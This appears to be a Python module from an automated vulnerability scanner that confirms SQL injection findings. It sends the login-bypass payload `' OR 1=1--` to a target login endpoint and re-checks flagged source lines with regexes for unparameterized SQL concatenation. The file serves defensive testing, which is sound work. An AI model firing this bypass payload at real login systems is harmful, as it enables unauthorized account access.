"""SentraX AI — SQL Injection confirmation rule.

Reference: Docs/Agents.md Section 3, Docs/custom-target.md Section 1.
Ground truth target: POST /api/login, `' OR 1=1--` in the email field.

Confirmed (DAST) = login succeeds (HTTP 200 with a success/token indicator)
using the injection payload and no real credentials.
Confirmed (SAST) = the flagged line concatenates raw input into a SQL
keyword with no parameterization placeholder on the same line.
"""

from __future__ import annotations

import re
from typing import Any, Dict, Tuple
from urllib.parse import urljoin

import requests

VULN_TYPE = "sqli"
TIMEOUT = 10.0

PAYLOAD_EMAIL = "' OR 1=1--"
PAYLOAD_PASSWORD = "anything"

# Independent re-check, deliberately separate from Recon's SAST_RULES regex —
# this is what makes SAST confirmation a real second look, not just trusting
# the initial pattern match.
_CONCAT_PATTERN = re.compile(
    r"""(?:SELECT\b|INSERT\s+INTO\b|UPDATE\b|DELETE\s+FROM\b).*?['"]\s*\+\s*[a-zA-Z0-9_]+"""
    r"""|f["'].*?(?:SELECT\b|INSERT\s+INTO\b|UPDATE\b|DELETE\s+FROM\b).*?\{[a-zA-Z0-9_]+\}""",
    re.IGNORECASE,
)
_PARAMETERIZED_PATTERN = re.compile(r"""\?\s*[,)]|%s\b|\.execute\([^,]+,\s*[\[\(]""")


def confirm_dast(session: requests.Session, base_url: str, target: str) -> Tuple[bool, Dict[str, Any]]:
    """Send the SQLi login-bypass payload against `target` (e.g. /api/login) and check for bypass."""
    url = urljoin(base_url, target)
    request_sent = f'POST {target} with email="{PAYLOAD_EMAIL}" and password="{PAYLOAD_PASSWORD}"'

    try:
        resp = session.post(url, json={"email": PAYLOAD_EMAIL, "password": PAYLOAD_PASSWORD}, timeout=TIMEOUT)
    except requests.exceptions.RequestException as e:
        return False, {
            "request_sent": request_sent,
            "response_snippet": f"Request failed: {e}",
            "why_confirmed": "Request could not be completed against the target; treating as not confirmed.",
        }

    snippet = resp.text[:500]
    login_succeeded = False
    if resp.status_code == 200:
        try:
            data = resp.json()
            login_succeeded = bool(data.get("success")) or bool(data.get("token"))
        except ValueError:
            login_succeeded = False

    if login_succeeded:
        return True, {
            "request_sent": request_sent,
            "response_snippet": snippet,
            "why_confirmed": "Login succeeded (HTTP 200 with a success/token indicator) using an unescaped "
            "SQL injection payload in the email field, with no valid credentials supplied.",
        }
    return False, {
        "request_sent": request_sent,
        "response_snippet": snippet,
        "why_confirmed": f"Login did not succeed (HTTP {resp.status_code}, no success/token indicator) — "
        "input appears to be parameterized or escaped.",
    }


def confirm_sast(snippet: str, file: str, line: int) -> Tuple[bool, Dict[str, Any]]:
    """Independently re-check a flagged source line for raw SQL string concatenation."""
    request_sent = f"Static code re-check of {file}:{line}"

    if _PARAMETERIZED_PATTERN.search(snippet):
        return False, {
            "request_sent": request_sent,
            "response_snippet": snippet,
            "why_confirmed": "Query appears to use a parameterized placeholder (?, %s, or execute(query, params)) "
            "rather than raw string concatenation — not exploitable as flagged.",
        }
    if _CONCAT_PATTERN.search(snippet):
        return True, {
            "request_sent": request_sent,
            "response_snippet": snippet,
            "why_confirmed": "User input is concatenated directly into a SQL query string with no "
            "parameterization, confirmed by independent re-check of the source line.",
        }
    return False, {
        "request_sent": request_sent,
        "response_snippet": snippet,
        "why_confirmed": "Independent re-check did not find a string-concatenation-into-SQL pattern on this "
        "line — likely a false positive from initial recon.",
    }
